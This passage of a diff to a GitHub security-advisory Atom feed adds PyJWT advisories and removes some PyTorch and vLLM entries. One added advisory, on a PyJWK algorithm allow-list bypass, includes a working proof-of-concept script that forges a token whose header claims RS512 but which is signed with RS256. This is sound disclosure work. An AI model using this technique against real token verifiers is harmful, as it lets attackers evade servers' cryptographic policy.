+<p>PyJWT <code>2.9.0</code> through <code>2.12.1</code> allows a verifier-side algorithm allow-list bypass when <code>jwt.decode()</code> or <code>jwt.decode_complete()</code> are called with a <code>PyJWK</code> key. The token header <code>alg</code> is checked against the caller-supplied <code>algorithms</code> allow-list, but signature verification is performed with the algorithm bound to the <code>PyJWK</code> object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented <code>PyJWKClient.get_signing_key_from_jwt(...)</code> flow.</p>
+<h3 id="summary">Summary</h3>
+<p>PyJWT's <code>PyJWK</code> verification path allows a verifier-side algorithm allow-list bypass.</p>
+<p>In affected versions, when a JWT is decoded with a <code>PyJWK</code> object, PyJWT verifies that the header <code>alg</code> string is present in the caller's <code>algorithms=[...]</code> list, but it does not actually use the header algorithm to verify the signature. Instead, it verifies with the algorithm already bound to the <code>PyJWK</code> object.</p>
+<p>This lets an attacker who controls a registered JWK/JWKS private key sign with a disallowed algorithm and have the token accepted as long as the JWT header advertises an allowed algorithm. This affects the documented <code>PyJWKClient</code> usage flow and does not require any non-default flags or unsafe configuration.</p>
+<h3 id="details">Details</h3>
+<p>In <code>jwt/api_jws.py</code> in <code>2.12.1</code>, <code>_verify_signature()</code> treats <code>PyJWK</code> keys differently from normal PEM/public-key inputs:</p>
+<pre><code class="language-python">if algorithms is None and isinstance(key, PyJWK):
+    algorithms = [key.algorithm_name]
+
+...
+
+if not alg or (algorithms is not None and alg not in algorithms):
+    raise InvalidAlgorithmError("The specified alg value is not allowed")
+
+if isinstance(key, PyJWK):
+    alg_obj = key.Algorithm
+    prepared_key = key.key
+else:
+    alg_obj = self.get_algorithm_by_name(alg)
+    prepared_key = alg_obj.prepare_key(key)
+</code></pre>
+<p>This logic means:</p>
+<ol>
+<li>The JWT header <code>alg</code> is checked only as a string against the caller-supplied allow-list.</li>
+<li>If the key is a <code>PyJWK</code>, the actual verifier is not selected from the header algorithm.</li>
+<li>Instead, PyJWT always verifies with <code>key.Algorithm</code>, which is fixed when the <code>PyJWK</code> object is created.</li>
+</ol>
+<p><code>PyJWK</code> binds its algorithm in <code>jwt/api_jwk.py</code> from the JWK's <code>alg</code> field or from key-type defaults:</p>
+<pre><code class="language-python">if not algorithm and isinstance(self._jwk_data, dict):
+    algorithm = self._jwk_data.get("alg", None)
+
+...
+
+self.algorithm_name = algorithm
+self.Algorithm = get_default_algorithms()[algorithm]
+self.key = self.Algorithm.from_jwk(self._jwk_data)
+</code></pre>
+<p>So once a <code>PyJWK</code> is constructed, the verifier uses the <code>PyJWK</code>'s bound algorithm, not the JWT header algorithm.</p>
+<p>The issue is reachable through the documented JWKS flow. In <code>docs/usage.rst</code>, the project documents:</p>
+<pre><code class="language-python">signing_key = jwks_client.get_signing_key_from_jwt(token)
+jwt.decode(
+    token,
+    signing_key,
+    audience="https://expenses-api",
+    options={"verify_exp": False},
+    algorithms=["RS256"],
+)
+</code></pre>
+<p><code>PyJWKClient.get_signing_key_from_jwt()</code> returns a <code>PyJWK</code>, so this documented path is affected.</p>
+<p>This is not a "no-key forgery" issue. The attacker still needs control of an accepted JWK/JWKS private key. However, that is realistic in deployments such as:</p>
+<ul>
+<li>self-service OAuth client assertions</li>
+<li>multi-tenant key registration</li>
+<li>federation / BYO-JWKS trust models</li>
+<li>any system where external parties sign JWTs with their own registered keys</li>
+</ul>
+<p>In those cases, the attacker can bypass verifier-side algorithm policy. For example, if the server intends to only accept <code>PS256</code>, an attacker controlling an accepted RSA JWK can sign with <code>RS256</code>, set <code>alg=PS256</code> in the JWT header, and still be accepted through the <code>PyJWK</code> path.</p>
+<p>The same forged token is rejected through the normal PEM/public-key verification path, which shows the bug is specific to <code>PyJWK</code> verification rather than expected JWT behavior.</p>
+<p>This behavior was introduced by commit <code>ab8176abe21e550dbc1c9a6bb7e78ad80853bfb1</code> (<code>Decode with PyJWK (#886)</code>), which is present in tagged releases <code>2.9.0</code>, <code>2.10.0</code>, <code>2.10.1</code>, <code>2.11.0</code>, <code>2.12.0</code>, and <code>2.12.1</code>.</p>
+<h3 id="poc">PoC</h3>
+<p>Tested locally against PyJWT <code>2.12.1</code> on Python <code>3.12.10</code> with <code>cryptography 45.0.6</code>.</p>
+<p>Install dependencies:</p>
+<pre><code class="language-bash">python -m pip install pyjwt==2.12.1 cryptography
+</code></pre>
+<p>Run the following script:</p>
+<pre><code class="language-python">import json
+import jwt
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+from jwt.api_jwk import PyJWK
+from jwt.algorithms import RSAAlgorithm
+from jwt.utils import base64url_encode
+
+# Generate an RSA keypair controlled by the attacker.
+priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pub = priv.public_key()
+pub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
+
+# Build a PyJWK from the public key.
+# With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default.
+jwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))
+
+# Create a token whose protected header claims RS512.
+header = {"typ": "JWT", "alg": "RS512"}
+payload = {"sub": "alice"}
+
+header_b64 = base64url_encode(
+    json.dumps(header, separators=(",", ":"), sort_keys=True).encode()
+)
+payload_b64 = base64url_encode(
+    json.dumps(payload, separators=(",", ":")).encode()
+)
+signing_input = b".".join([header_b64, payload_b64])
+
+# Sign the RS512-labelled token with RS256 instead.
+sig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv)
+token = b".".join([header_b64, payload_b64, base64url_encode(sig)]).decode()
+
+print("token:", token)
+print("PyJWK path:")
+print(jwt.decode(token, jwk, algorithms=["RS512"]))
+
+print("PEM path:")
+try:
+    print(jwt.decode(token, pub_pem, algorithms=["RS512"]))
+except Exception as e:
+    print(f"{type(e).__name__}: {e}")
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">PyJWK path:
+{'sub': 'alice'}
+PEM path:
+InvalidSignatureError: Signature verification failed
+</code></pre>
+<p>The token is accepted when the verification key is a <code>PyJWK</code>, even though:</p>
+<ul>
+<li>the caller restricted allowed algorithms to <code>["RS512"]</code></li>
+<li>the signature was actually generated with <code>RS256</code></li>
+</ul>
+<p>The same token is rejected when verified through the normal PEM/public-key path.</p>
+<h3 id="impact">Impact</h3>
+<p>This is an algorithm allow-list bypass affecting <code>jwt.decode()</code> and <code>jwt.decode_complete()</code> when the verification key is a <code>PyJWK</code>, including keys returned by <code>PyJWKClient</code>.</p>
+<p>The impact depends on the deployment model:</p>
+<ul>
+<li>If attackers cannot control any accepted JWK/JWKS private key, practical exploitability is limited.</li>
+<li>If attackers can legitimately control a registered key, this is exploitable.</li>
+</ul>
+<p>Impacted deployments include:</p>
+<ul>
+<li>JWT client assertion flows where each client uses its own key</li>
+<li>multitenant systems where tenants register JWK/JWKS material</li>
+<li>federation-style trust models</li>
+<li>any application that relies on <code>algorithms=[...]</code> to enforce a crypto policy against externally controlled signing keys</li>
+</ul>
+<p>What an attacker can do:</p>
+<ul>
+<li>bypass a server-side requirement such as "only <code>PS256</code>" or "only <code>RS512</code>"</li>
+<li>continue using a deprecated or blocked algorithm after the server thought it had disabled it</li>
+<li>authenticate successfully as their own client / tenant / federation principal even though they do not satisfy the configured algorithm policy</li>
+</ul>
+<p>What this issue does not do by itself:</p>
+<ul>
+<li>it does not let an attacker forge tokens without access to a valid signing key or signing oracle</li>
+<li>it does not automatically enable cross-tenant impersonation unless the surrounding application trust model adds another flaw</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48523">https://nvd.nist.gov/vuln/detail/CVE-2026-48523</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-176.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-176.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-jq35-7prp-9v3f">https://github.com/advisories/GHSA-jq35-7prp-9v3f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jq35-7prp-9v3f</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-15T19:27:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyjwt] PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)]]></title>
+        <id>https://github.com/advisories/GHSA-fhv5-28vv-h8m8</id>
+        <link href="https://github.com/advisories/GHSA-fhv5-28vv-h8m8"/>
+        <updated>2026-06-15T17:28:46.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>[!NOTE]
+ The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.</p>
+</blockquote>
+<h2 id="summary">Summary</h2>
+<p>PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.</p>
+<p>Additionally, fetch_data() finally block clears the JWKS cache on network error.</p>
+<h2 id="root-cause">Root Cause</h2>
+<p>jwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown.
+jwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>DoS against JWKS endpoint (unlimited requests per invalid token)</li>
+<li>DoS against application (network I/O latency)</li>
+<li>Cascading failure (rate limiting clears cache, breaking legitimate auth)</li>
+</ul>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<ol>
+<li>Add refresh cooldown (refuse refresh more than once per TTL period)</li>
+<li>Move cache write from finally to else block</li>
+</ol>
+<h2 id="affected-versions">Affected Versions</h2>
+<p>All versions with PyJWKClient (2.4.0 through 2.12.1)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48524">https://nvd.nist.gov/vuln/detail/CVE-2026-48524</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-177.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-177.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-fhv5-28vv-h8m8">https://github.com/advisories/GHSA-fhv5-28vv-h8m8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fhv5-28vv-h8m8</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-15T17:28:46.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[tornado] Tornado has out-of-bounds memory access via C extension]]></title>
         <id>https://github.com/advisories/GHSA-cx3h-4qpv-8hc9</id>
@@ -1081,192 +1821,5 @@ app = Litestar(
         </author>
         <category label="severity" term="LOW"/>
         <published>2025-03-31T18:31:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[torch] PyTorch is vulnerable to memory corruption through its torch.jit.script function]]></title>
-        <id>https://github.com/advisories/GHSA-rrmf-rvhw-rf47</id>
-        <link href="https://github.com/advisories/GHSA-rrmf-rvhw-rf47"/>
-        <updated>2026-06-10T18:02:15.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability classified as critical has been found in PyTorch 2.6.0. This affects the function torch.jit.script. The manipulation leads to memory corruption. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3000">https://nvd.nist.gov/vuln/detail/CVE-2025-3000</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/149623">https://github.com/pytorch/pytorch/issues/149623</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/149623#issue-2935703015">https://github.com/pytorch/pytorch/issues/149623#issue-2935703015</a></li>
-<li><a href="https://vuldb.com/?ctiid.302049">https://vuldb.com/?ctiid.302049</a></li>
-<li><a href="https://vuldb.com/?id.302049">https://vuldb.com/?id.302049</a></li>
-<li><a href="https://vuldb.com/?submit.524197">https://vuldb.com/?submit.524197</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-194.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-194.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-rrmf-rvhw-rf47">https://github.com/advisories/GHSA-rrmf-rvhw-rf47</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rrmf-rvhw-rf47</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-03-31T15:30:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[torch] PyTorch is vulnerable to memory corruption through its unpack_sequence function]]></title>
-        <id>https://github.com/advisories/GHSA-vgrw-7cvw-pwgx</id>
-        <link href="https://github.com/advisories/GHSA-vgrw-7cvw-pwgx"/>
-        <updated>2026-06-10T17:25:21.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability was found in PyTorch 2.6.0. It has been rated as critical. Affected by this issue is the function torch.nn.utils.rnn.unpack_sequence. The manipulation leads to memory corruption. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.</p>
-<p>A patch is available through commit <a href="https://github.com/pytorch/pytorch/commit/494518046816d29099b7d056a74ffa5c244fdcdd">4945180</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2999">https://nvd.nist.gov/vuln/detail/CVE-2025-2999</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/149622">https://github.com/pytorch/pytorch/issues/149622</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/149622#issue-2935495265">https://github.com/pytorch/pytorch/issues/149622#issue-2935495265</a></li>
-<li><a href="https://vuldb.com/?ctiid.302048">https://vuldb.com/?ctiid.302048</a></li>
-<li><a href="https://vuldb.com/?id.302048">https://vuldb.com/?id.302048</a></li>
-<li><a href="https://vuldb.com/?submit.524198">https://vuldb.com/?submit.524198</a></li>
-<li><a href="https://github.com/pytorch/pytorch/commit/494518046816d29099b7d056a74ffa5c244fdcdd">https://github.com/pytorch/pytorch/commit/494518046816d29099b7d056a74ffa5c244fdcdd</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-193.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-193.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-vgrw-7cvw-pwgx">https://github.com/advisories/GHSA-vgrw-7cvw-pwgx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vgrw-7cvw-pwgx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-03-31T15:30:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vllm] vLLM's Artifact Pin Decay allows pinned deployments to load unpinned code, weights, and processors]]></title>
-        <id>https://github.com/advisories/GHSA-3ww4-5jv9-j5gm</id>
-        <link href="https://github.com/advisories/GHSA-3ww4-5jv9-j5gm"/>
-        <updated>2026-06-10T17:11:39.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>vLLM's revision pinning controls do not consistently apply to all artifacts loaded for a model. A deployment that supplies <code>--revision</code> or <code>--code-revision</code> can still load dynamic code, GGUF files, image processors, retrieval side weights, or same-repository subfolder weights/config from an unpinned/default revision.</p>
-<p>This is a supply-chain integrity issue for pinned vLLM deployments. Operators can believe they are serving a reviewed model revision while vLLM resolves behavior-affecting nested or sibling artifacts outside that reviewed revision.</p>
-<h3 id="details">Details</h3>
-<p>The expected invariant is:</p>
-<blockquote>
-<p>When a vLLM operator supplies a model or code revision pin, every code, config, processor, weight file, side weight, and same-repository subfolder artifact loaded as part of that model should resolve under that pin unless vLLM exposes and enforces a separate explicit pin for that artifact.</p>
-</blockquote>
-<p>Current <code>main</code> was verified affected at commit <code>3795d7acf431980e62e738493f437ae2a51549da</code>.</p>
-<p>Affected source boundaries:</p>
-<ul>
-<li><code>vllm/model_executor/models/registry.py:1045-1051</code> and <code>:1058-1064</code><ul>
-<li><code>_try_resolve_transformers()</code> passes <code>revision=model_config.revision</code> and <code>trust_remote_code=model_config.trust_remote_code</code>, but omits <code>code_revision=model_config.code_revision</code> for external <code>auto_map</code> dynamic module imports.</li>
-</ul>
-</li>
-<li><code>vllm/model_executor/model_loader/gguf_loader.py:58-60</code><ul>
-<li>The direct-file GGUF form <code>repo/file.gguf</code> calls <code>hf_hub_download(repo_id=repo_id, filename=filename)</code> without passing <code>revision</code>.</li>
-</ul>
-</li>
-<li><code>vllm/model_executor/models/roberta.py:203-209</code><ul>
-<li>BGE-M3 secondary sparse and ColBERT side weights are declared with <code>revision=None</code>.</li>
-</ul>
-</li>
-<li><code>vllm/model_executor/models/kimi_k25.py:111-114</code><ul>
-<li>Kimi-K2.5 calls <code>cached_get_image_processor()</code> without passing <code>model_config.revision</code>.</li>
-</ul>
-</li>
-<li><code>vllm/model_executor/models/kimi_audio.py:92-95</code><ul>
-<li>Kimi-Audio loads Whisper config from the <code>whisper-large-v3</code> subfolder without a <code>revision</code> argument.</li>
-</ul>
-</li>
-<li><code>vllm/model_executor/models/kimi_audio.py:425-430</code><ul>
-<li>Kimi-Audio declares same-repository <code>whisper-large-v3</code> secondary weights with <code>revision=None</code>.</li>
-</ul>
-</li>
-<li><code>vllm/model_executor/model_loader/default_loader.py:287-301</code><ul>
-<li>The default loader preserves <code>model_config.revision</code> for the primary source, then consumes model-supplied secondary sources as declared.</li>
-</ul>
-</li>
-</ul>
-<p>The strongest example is Kimi-Audio: the primary <code>moonshotai/Kimi-Audio-7B-Instruct</code> weights preserve the configured model revision, but the same-repository <code>whisper-large-v3</code> audio tower config/weights do not. A pinned Kimi-Audio deployment can therefore load the Whisper subfolder outside the audited revision.</p>
-<p>This report does not claim a <code>trust_remote_code=False</code> bypass, unauthenticated RCE, or real artifact compromise. The issue is improper propagation of explicit artifact pins across supported loader paths.</p>
-<h3 id="impact">Impact</h3>
-<p>Affected users are operators who pin vLLM model deployments to a reviewed Hugging Face revision for safety review, provenance, rollback, or reproducibility. The impact is that the pin does not reliably describe the full set of artifacts vLLM serves. Even when the operator selects an audited revision, vLLM can resolve behavior-affecting secondary artifacts from the repository default branch or another mutable ref.</p>
-<p>Depending on the model path, the unpinned artifact can be dynamic model code, a GGUF file, an image processor, retrieval side weights, or the same-repository Kimi-Audio Whisper subfolder weights/config.</p>
-<p>This breaks the operational guarantee of a pinned deployment: "serve the exact artifact set I reviewed." A later change to an unpinned secondary artifact can alter model behavior without changing the operator's configured revision, making review, rollback, incident response, and audit records unreliable.</p>
-<h3 id="occurrences">Occurrences</h3>
-<ul>
-<li><code>vllm/model_executor/models/kimi_k25.py</code> L111-L114 — Kimi-K2.5 loads its image processor with <code>cached_get_image_processor()</code> but does not pass <code>self.ctx.model_config.revision</code>. The processor can therefore resolve from the default repository revision even when the model deployment is pinned.</li>
-<li><code>vllm/model_executor/models/kimi_audio.py</code> L425-L430 — Kimi-Audio declares same-repository <code>whisper-large-v3</code> secondary weights with <code>revision=None</code>. A pinned Kimi-Audio deployment can therefore load the Whisper audio tower weights from an unpinned/default revision.</li>
-<li><code>vllm/model_executor/models/kimi_audio.py</code> L92-L95 — Kimi-Audio loads Whisper config from the same repository's <code>whisper-large-v3</code> subfolder without passing the top-level model revision. The config for this behavior-affecting subcomponent can be resolved outside the audited model revision.</li>
-<li><code>vllm/model_executor/models/registry.py</code> L1058-L1064 — The later dynamic model-class resolution repeats the same pin-decay pattern: it forwards <code>revision</code> and <code>trust_remote_code</code>, but omits <code>code_revision</code>. This means an operator-provided code pin is not enforced at the dynamic module loader boundary.</li>
-<li><code>vllm/model_executor/model_loader/gguf_loader.py</code> L58-L60 — The direct GGUF form <code>repo/file.gguf</code> calls <code>hf_hub_download(repo_id=repo_id, filename=filename)</code> without passing <code>model_config.revision</code>. A deployment that pins the model revision can therefore resolve this GGUF file from the repository default revision.</li>
-<li><code>vllm/model_executor/models/registry.py</code> L1045-L1051 — <code>try_get_class_from_dynamic_module()</code> is called for external <code>auto_map</code> config/model classes with <code>revision=model_config.revision</code>, but without forwarding <code>model_config.code_revision</code>. When <code>--code-revision</code> is set, this dynamic module resolution can still fall back to the default code revision instead of the audited code revision.</li>
-<li><code>vllm/model_executor/models/roberta.py</code> L203-L209 — <code>BgeM3EmbeddingModel</code> creates same-repository secondary sparse/ColBERT weight sources with <code>revision=None</code>. The primary model revision is not propagated to these side weights, so they can be downloaded outside the operator-selected model revision.</li>
-</ul>
-<h3 id="fixes">Fixes</h3>
-<p>This was fixed in: <a href="https://github.com/vllm-project/vllm/pull/42616">https://github.com/vllm-project/vllm/pull/42616</a></p>
-<hr>
-<p>Originally filed via huntr: <a href="https://huntr.com/bounties/3f1e24c0-87d2-4f6c-a705-820f380879ac">https://huntr.com/bounties/3f1e24c0-87d2-4f6c-a705-820f380879ac</a>.</p>
-<p>The vLLM maintainer (Russell Bryant) redirected the report to the private GHSA channel. Offline proof bundle (<code>vllm_artifact_pin_decay_bundle_verify.py</code> + <code>bundle-verification-20260430T143506Z.json</code>) is available upon request.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-3ww4-5jv9-j5gm">https://github.com/vllm-project/vllm/security/advisories/GHSA-3ww4-5jv9-j5gm</a></li>
-<li><a href="https://github.com/advisories/GHSA-3ww4-5jv9-j5gm">https://github.com/advisories/GHSA-3ww4-5jv9-j5gm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3ww4-5jv9-j5gm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-10T17:11:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[torch] PyTorch: Manipulation of the argument scale/zero_point leads to improper initialization via Quantized Sigmoid Module]]></title>
-        <id>https://github.com/advisories/GHSA-x3gm-94wq-g975</id>
-        <link href="https://github.com/advisories/GHSA-x3gm-94wq-g975"/>
-        <updated>2026-06-09T21:57:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability was found in PyTorch 2.6.0+cu124. It has been rated as problematic. Affected by this issue is the function nnq_Sigmoid of the component Quantized Sigmoid Module. The manipulation of the argument scale/zero_point leads to improper initialization. The attack needs to be approached locally. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2149">https://nvd.nist.gov/vuln/detail/CVE-2025-2149</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/147818">https://github.com/pytorch/pytorch/issues/147818</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/147818#issue-2877301660">https://github.com/pytorch/pytorch/issues/147818#issue-2877301660</a></li>
-<li><a href="https://vuldb.com/?ctiid.299060">https://vuldb.com/?ctiid.299060</a></li>
-<li><a href="https://vuldb.com/?id.299060">https://vuldb.com/?id.299060</a></li>
-<li><a href="https://vuldb.com/?submit.506563">https://vuldb.com/?submit.506563</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-190.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-190.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-x3gm-94wq-g975">https://github.com/advisories/GHSA-x3gm-94wq-g975</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x3gm-94wq-g975</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-03-10T15:30:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[torch] PyTorch is Vulnerable to Memory Consumption through pad_packed_sequence Function]]></title>
-        <id>https://github.com/advisories/GHSA-f4hp-rmr7-r7v8</id>
-        <link href="https://github.com/advisories/GHSA-f4hp-rmr7-r7v8"/>
-        <updated>2026-06-09T21:56:31.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability was found in PyTorch 2.6.0. It has been declared as critical. Affected by this vulnerability is the function torch.nn.utils.rnn.pad_packed_sequence. The manipulation leads to memory corruption. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2998">https://nvd.nist.gov/vuln/detail/CVE-2025-2998</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/149622">https://github.com/pytorch/pytorch/issues/149622</a></li>
-<li><a href="https://github.com/pytorch/pytorch/issues/149622#issue-2935495265">https://github.com/pytorch/pytorch/issues/149622#issue-2935495265</a></li>
-<li><a href="https://vuldb.com/?ctiid.302047">https://vuldb.com/?ctiid.302047</a></li>
-<li><a href="https://vuldb.com/?id.302047">https://vuldb.com/?id.302047</a></li>
-<li><a href="https://vuldb.com/?submit.524151">https://vuldb.com/?submit.524151</a></li>
-<li><a href="https://github.com/pytorch/pytorch/commit/494518046816d29099b7d056a74ffa5c244fdcdd">https://github.com/pytorch/pytorch/commit/494518046816d29099b7d056a74ffa5c244fdcdd</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-192.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-192.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-f4hp-rmr7-r7v8">https://github.com/advisories/GHSA-f4hp-rmr7-r7v8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f4hp-rmr7-r7v8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-03-31T15:30:48.000Z</published>
     </entry>
 </feed>
